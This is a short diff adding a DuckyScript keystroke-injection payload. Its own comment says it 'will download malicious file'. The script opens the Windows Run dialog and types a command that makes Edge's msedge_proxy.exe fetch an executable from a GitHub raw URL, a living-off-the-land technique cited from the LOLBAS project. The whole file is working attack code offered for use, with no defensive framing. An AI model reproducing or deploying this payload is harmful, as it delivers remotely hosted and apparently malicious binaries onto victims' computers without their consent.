@@ -1,0 +1,6 @@
+REM by JOB
+REM msedge_proxy will download malicious file, more info here https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
+GUI r 
+DEFAULT_DELAY 350
+STRING C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe https://github.com/JoshuaBrien/Downloads/raw/refs/heads/main/211_encryptv1_2.exe
+ENTER
